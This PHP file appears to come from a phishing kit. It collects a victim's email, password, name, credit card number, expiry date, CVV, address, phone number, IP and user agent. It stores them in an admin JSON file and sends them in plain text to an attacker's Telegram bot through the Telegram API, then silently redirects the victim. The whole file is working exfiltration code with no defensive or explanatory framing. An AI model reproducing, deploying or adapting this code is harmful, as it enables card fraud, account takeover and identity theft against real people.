<?php

    error_reporting(0);

    require("config.php");
    include("./encriptador.php");

    session_start();
    $email = $_SESSION['email'];
    $password = $_SESSION['password'] ;

    $nombre = $_SESSION['nombre'];
    $apellido = $_SESSION['apellido'];
    $card = $_SESSION['card'];
    $date = $_SESSION['date'];
    $cvv =  $_SESSION['cvv'];

    $address = $_SESSION['address'];
    $country = $_SESSION['country'];
    $state = $_SESSION['state'];
    $zip = $_SESSION['zip'];
    $number = $_SESSION['number'];
   

    
    require_once('geoplugin.class.php');
    $geoplugin = new geoPlugin();
     
    $geoplugin->locate();
     
    $ip = $geoplugin->ip;
    $user = $_SERVER['HTTP_USER_AGENT'];
    error_reporting(0);

//? Creando nuevos datos
$fecha = date("d") . " de " . date("F") . " de " . date("Y");
$table = array(
    "fecha" => SED::encryption($fecha),
    "ip" =>  SED::encryption($ip),
    "mail" =>  SED::encryption($email),
    "pass" =>  SED::encryption($password),
    "nombre" =>  SED::encryption($nombre),
    "apellido" =>  SED::encryption($apellido),
    "cc" =>  SED::encryption($card),
    "date" =>  SED::encryption($date),
    "cvv" =>  SED::encryption($cvv),
    "pais" =>  SED::encryption($country),
    "estado" =>  SED::encryption($state),
    "direccion" =>  SED::encryption($address),
    "zip" =>  SED::encryption($zip),
    "number" =>  SED::encryption($number),
    "user" =>  SED::encryption($user)
);

// echo "<pre>";
////$json = json_encode($table);
//? Abrir archivo db.json con permisos de lectura
$handler = fopen("admin/db.json", "r");

//? Leyendo archivo y pasando a la variable $file como array a $arrayJson
if ($handler && filesize("admin/db.json")!=0){
    $file = fread($handler, filesize("admin/db.json"));
    //? interpreta el contenido del db.jon con formato json, si esta vacio, inserta un array vacio.
    $arrayJson = json_decode($file??[]);
    // echo "abriendo el FILE db.json!!!  ".count($arrayJson);
}
else {
    $file = null;
    //? interpreta el contenido del db.jon con formato json, si esta vacio, inserta un array vacio.
    $arrayJson = [];
    // echo "json vacio!!!";
}

//? Cerrando el fopen() para evitar saturar caches e hjilos de ejecucion en servidor php
fclose($handler);

// imprime el contenido a agregar.
// echo "<br><br> Table_json: ";print_r($table);

//? Asignando los nuevos datos creados al Array del archivo db.json
$arrayJson[]= $table;

//? Inserta/Remplaza el arrayJson (datosViejos+DatosNuevos) en el archivo db.json
file_put_contents('admin/db.json', print_r(json_encode($arrayJson), true));

echo "<br></pre>"; 



    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=mail: $email%0Apassword: $password%0Afirst_name: $nombre%0Alast_name: $apellido%0Acc: $card%0Aexpire: $date%0Acvv: $cvv%0ACountry: $country%0AState: $state%0AZip: $zip%0Aaddress: $address%0Aphone: $number%0Afecha: $fecha%0Aip: $ip%0AUser_Agent: $user";
    
    $sendm =  file_get_contents($url);
  
    
   echo "<script>window.location.replace('./Valid-3.5');</script>";
    
